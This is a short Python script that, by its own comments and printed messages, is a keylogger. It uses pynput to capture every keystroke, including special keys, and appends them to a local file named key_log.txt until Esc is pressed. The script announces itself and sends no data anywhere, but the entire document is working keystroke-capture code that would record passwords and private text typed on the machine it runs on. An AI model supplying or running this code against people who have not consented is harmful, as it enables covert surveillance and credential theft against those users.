from pynput import keyboard

# File to store the logged keys
LOG_FILE = "key_log.txt"

def on_press(key):
    try:
        # Open file in append mode
        with open(LOG_FILE, "a") as log_file:
            # Write the key pressed to the file
            log_file.write(f"{key.char}")
    except AttributeError:
        # Handle special keys like space, enter, backspace
        with open(LOG_FILE, "a") as log_file:
            log_file.write(f" [{key}] ")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener on 'Esc' key press
        print("Exiting keylogger...")
        return False

if __name__ == "__main__":
    print("Keylogger is running. Press 'Esc' to stop.")

    # Start the listener for keypress events
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
